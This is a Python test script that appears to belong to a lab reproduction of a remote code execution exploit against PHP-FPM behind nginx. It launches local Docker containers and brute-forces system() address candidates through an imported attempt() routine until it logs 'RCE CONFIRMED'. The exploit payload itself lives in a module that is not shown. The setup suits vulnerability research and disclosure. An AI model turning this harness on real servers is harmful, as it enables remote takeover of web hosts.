#!/usr/bin/env python3
"""PHP-FPM + nginx deployment shape.

Production-representative target: nginx -> FastCGI -> php-fpm pool.
Reuses rce_bruteforce's attempt() unchanged; only the container plumbing
differs from the apache shape:

    fpm-php   php:8.4.26-fpm    webroot + zz-lab.ini + zz-pool.conf
    fpm-a     nginx:stable      webroot (static + /u.txt proof) + FastCGI

Worker model: with pm=static/max_children=1 the leak and the exploit hit
the SAME worker deterministically (fpm-lab equivalent of the mpm pin).
With max_children=W the pair lands on a random worker -> hit probability
per attempt ~ 1/W when more than one worker is enabled.

The fpm MASTER's maps define D (children fork it) - fingerprint.py reads
it via docker exec, same as the apache shape.

Usage:
    python3 tests/fpm_rce.py --port 28095 --children 1 \
        [--profile out/profiles/php-8.4.26-fpm.json] \
        [--max-attempts 200] [--out ...]
"""
import argparse
import json
import os
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tests"))

import rce_bruteforce as B  # noqa: E402

FPM_NAME = "fpm-php"
NGX_NAME = "fpm-a"
NET_NAME = "fpmnet"


def sh(cmd, timeout=120):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout)


def wait_port(port, timeout=60):
    import socket
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=2):
                return True
        except OSError:
            time.sleep(0.5)
    return False


def start_fpm(port, children=1, platform="", ptrace=False,
              image="php:8.4.26-fpm"):
    logdir = os.path.join(ROOT, "evidence", "logs", "fpm")
    os.makedirs(logdir, exist_ok=True)
    stop_fpm()
    sh("docker network create %s >/dev/null 2>&1" % NET_NAME)
    plat = ("--platform %s " % platform) if platform else ""
    cap = "--cap-add=SYS_PTRACE " if ptrace else ""
    pool = os.path.join(ROOT, "config", "fpm-pool.conf")
    pool_txt = open(pool).read().replace("pm.max_children = 1",
                                         "pm.max_children = %d" % children)
    pool_dyn = os.path.join(ROOT, "config", "fpm-pool-dyn.conf")
    with open(pool_dyn, "w") as fh:
        fh.write(pool_txt)
    nginx_conf = os.path.join(ROOT, "config", "nginx-default.conf")
    nginx_dyn = os.path.join(ROOT, "config", "nginx-default-dyn.conf")
    nginx_txt = open(nginx_conf).read().replace(
        "fpm-php:9000", "%s:9000" % FPM_NAME)
    with open(nginx_dyn, "w") as fh:
        fh.write(nginx_txt)
    r = sh(
        "docker run -d --name %s --network %s %s%s"
        "-m 1g --cpus=2 --pids-limit=256 "
        "-v %s/webroot:/var/www/html "
        "-v %s/config/php-lab.ini:/usr/local/etc/php/conf.d/zz-lab.ini:ro "
        "-v %s:/usr/local/etc/php-fpm.d/zz-pool.conf:ro "
        "-v %s:/var/log/fpm "
        "%s" % (FPM_NAME, NET_NAME, plat, cap, ROOT, ROOT,
                pool_dyn, logdir, image))
    if not r.stdout.strip():
        raise SystemExit("fpm run failed: %s" % r.stderr.strip())
    r = sh(
        "docker run -d --name %s --network %s %s"
        "-p 127.0.0.1:%d:80 "
        "-v %s/webroot:/var/www/html:ro "
        "-v %s:/etc/nginx/conf.d/default.conf:ro "
        "nginx:stable" % (NGX_NAME, NET_NAME, plat, port, ROOT, nginx_dyn))
    if not r.stdout.strip():
        raise SystemExit("nginx run failed: %s" % r.stderr.strip())
    sh("docker exec %s chmod 777 /var/www/html" % FPM_NAME)
    if not wait_port(port, timeout=60):
        raise SystemExit("nginx/fpm never came up")
    time.sleep(0.5)


def stop_fpm():
    sh("docker rm -f %s %s >/dev/null 2>&1" % (NGX_NAME, FPM_NAME))
    sh("docker network rm %s >/dev/null 2>&1" % NET_NAME)


def fpm_worker_count():
    r = sh("docker exec %s sh -c 'pgrep -c php-fpm || true'" % FPM_NAME)
    return r.stdout.strip()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=28095)
    ap.add_argument("--children", type=int, default=1)
    ap.add_argument("--platform", default="")
    ap.add_argument("--profile", default=None)
    ap.add_argument("--k-lo", type=int, default=0)
    ap.add_argument("--k-hi", type=int, default=None)
    ap.add_argument("--max-attempts", type=int, default=0)
    ap.add_argument("--cmd", default=B.CMD)
    ap.add_argument("--out", default=os.path.join(
        ROOT, "evidence", "runs", "rce-remote", "rce-fpm.json"))
    args = ap.parse_args()

    B.CMD = args.cmd
    B.CONTAINER = FPM_NAME          # g.log + proof-file ops via fpm-php
    if args.profile:
        with open(args.profile) as fh:
            p = json.load(fh)
        B.OFF_SYSTEM = p["off_system"]
        B.S_GRID_BASE = p["grid"]["base"]
        B.S_GRID_SLOTS = p["grid"]["slots"]
        B.ARDATA_OFF = int(p.get("ardata_off", "0x32c0"), 16)
        B.P0 = int(p.get("p0", "0x28"), 16)
        print("profile: off_system=0x%x grid_base=0x%x slots=%d (%s/%s)"
              % (B.OFF_SYSTEM, B.S_GRID_BASE, B.S_GRID_SLOTS,
                 p["arch"], p["platform"]), flush=True)
    khi = args.k_hi if args.k_hi is not None else B.S_GRID_SLOTS - 1
    os.makedirs(os.path.dirname(args.out), exist_ok=True)

    start_fpm(args.port, children=args.children, platform=args.platform)
    print("fpm workers: %s" % fpm_worker_count(), flush=True)

    attempts, hit = [], False
    klo = args.k_lo
    while True:
        for k in range(klo, khi + 1):
            s_cand = B.S_GRID_BASE + B.OFF_SYSTEM + k * 0x10000
            t0 = time.time()
            try:
                hit, info = B.attempt(args.port, s_cand, args.cmd)
            except Exception as e:  # noqa: BLE001
                hit, info = False, {"error": "%s: %s"
                                    % (type(e).__name__, e)}
            info["k"] = k
            info["secs"] = round(time.time() - t0, 1)
            attempts.append(info)
            print("attempt %2d S=0x%08x -> %s  (%.1fs)"
                  % (k, s_cand, "HIT" if hit else "miss", info["secs"]),
                  flush=True)
            if hit:
                break
        if hit or args.max_attempts <= 0 or len(attempts) >= args.max_attempts:
            break
        klo = args.k_lo

    result = {
        "deploy": "nginx + php-fpm (pm=static, max_children=%d)"
                  % args.children,
        "image": "php:8.4.26-fpm", "platform": args.platform or "native",
        "cmd": args.cmd, "attempts": attempts, "hit": hit,
        "attempts_used": len(attempts),
        "params": {"ARDATA_OFF": hex(B.ARDATA_OFF), "P0": hex(B.P0),
                   "S_GRID_BASE": hex(B.S_GRID_BASE),
                   "OFF_SYSTEM": hex(B.OFF_SYSTEM),
                   "profile": args.profile},
    }
    with open(args.out, "w") as fh:
        json.dump(result, fh, indent=2)
    print("\n%s  attempts=%d  saved: %s"
          % ("RCE CONFIRMED" if hit else "NO HIT", len(attempts), args.out))


if __name__ == "__main__":
    main()
